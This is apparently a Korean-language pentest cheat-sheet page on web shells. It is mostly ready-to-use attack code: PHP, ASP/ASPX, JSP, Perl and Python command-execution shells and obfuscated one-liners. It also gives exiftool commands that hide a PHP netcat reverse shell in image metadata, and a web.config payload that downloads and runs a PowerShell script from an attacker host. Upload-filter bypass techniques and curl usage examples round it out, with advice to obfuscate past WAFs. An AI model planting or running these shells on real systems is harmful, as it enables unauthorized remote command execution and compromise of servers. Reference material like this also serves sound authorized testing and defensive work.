---
sidebar_position: 3
---

# Web Shells

웹 서버에 업로드하여 명령을 실행할 수 있는 웹셸입니다.

## PHP Web Shells

### 기본

```php
<?php system($_GET['cmd']); ?>
```

### GET 파라미터

```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### POST 파라미터

```php
<?php echo exec($_POST['cmd']); ?>
```

### REQUEST (GET/POST 모두)

```php
<?php passthru($_REQUEST['cmd']); ?>
<?php echo system($_REQUEST['shell']); ?>
```

### 다양한 함수

```php
# system
<?php system($_GET['cmd']); ?>

# exec
<?php echo exec($_GET['cmd']); ?>

# passthru
<?php passthru($_GET['cmd']); ?>

# shell_exec
<?php echo shell_exec($_GET['cmd']); ?>

# popen
<?php
$handle = popen($_GET['cmd'], 'r');
echo fread($handle, 2096);
pclose($handle);
?>

# proc_open
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($_GET['cmd'], $descriptorspec, $pipes);
echo stream_get_contents($pipes[1]);
proc_close($process);
?>
```

### 한 줄 웹셸들

```php
<?php @eval($_POST['cmd']); ?>
<?php @system($_GET['c']); ?>
<?=`$_GET[x]`?>
<?=$_GET[0]($_GET[1]);?>
```

### 난독화된 웹셸

```php
<?php
$a = $_GET['a'];
$b = $_GET['b'];
$a($b);
?>
// 사용: shell.php?a=system&b=whoami
```

### Exiftool을 이용한 이미지 주입

```bash
# JPG
exiftool -Comment='<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"); ?>' shell.jpg

# PNG
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.png
exiftool "-comment<=back.php" back.png

# JPEG
exiv2 -c'A "<?php system($_REQUEST['cmd']);?>\"!' shell.jpeg
```

## ASP/ASPX Web Shells

### Classic ASP

```asp
<%
Set objShell = Server.CreateObject("WScript.Shell")
Set objExec = objShell.Exec(Request.QueryString("cmd"))
Response.Write(objExec.StdOut.ReadAll())
%>
```

### ASPX

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e)
{
    string cmd = Request.QueryString["cmd"];
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
</script>
```

### ASPX Web.config

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/payload.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

## JSP Web Shells

### 기본

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
int i;
while((i = in.read()) != -1) {
    out.print((char)i);
}
in.close();
%>
```

### Java Runtime

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

## Perl Web Shells

```perl
#!/usr/bin/perl
print "Content-Type: text/html\n\n";
print `$ENV{'QUERY_STRING'}`;
```

## Python Web Shells

### Flask

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd', '')
    return os.popen(cmd).read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

### CGI

```python
#!/usr/bin/env python
import cgi
import os

form = cgi.FieldStorage()
cmd = form.getvalue('cmd')

print("Content-Type: text/html\n")
print(os.popen(cmd).read())
```

## 업로드 우회 기법

### 파일 확장자

```
# PHP
.php, .php3, .php4, .php5, .phtml, .phar
.PhP, .Php5, .PhAr (대소문자 혼합)

# ASP
.asp, .aspx, .cer, .asa

# JSP
.jsp, .jspx

# 이중 확장자
shell.php.jpg
shell.jpg.php
shell.php%00.jpg (Null Byte, 구형 시스템)
```

### Content-Type 변조

```
# PHP 파일을 이미지로
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes 추가

```bash
# GIF89a를 파일 앞에 추가
echo 'GIF89a' > shell.php
cat original_shell.php >> shell.php

# PNG
printf '\x89\x50\x4E\x47' > shell.php
cat original_shell.php >> shell.php
```

## 일반적인 웹셸 위치

```
# Linux
/var/www/html/
/var/www/
/usr/share/nginx/html/
/opt/lampp/htdocs/

# Windows
C:\inetpub\wwwroot\
C:\xampp\htdocs\
```

## 사용 예제

```bash
# PHP 웹셸
curl http://<RHOST>/shell.php?cmd=whoami
curl http://<RHOST>/shell.php?cmd=id
curl -X POST http://<RHOST>/shell.php -d "cmd=ls -la"

# ASPX 웹셸
curl http://<RHOST>/shell.aspx?cmd=whoami
```

## 참고

- 항상 권한이 있는 시스템에서만 사용
- 업로드 후 즉시 제거 권장
- WAF 우회를 위해 난독화 고려
- Magic Bytes로 필터 우회 가능
- Null Byte는 구형 시스템에서만 작동
- Content-Type 검증만 하는 경우 쉽게 우회 가능
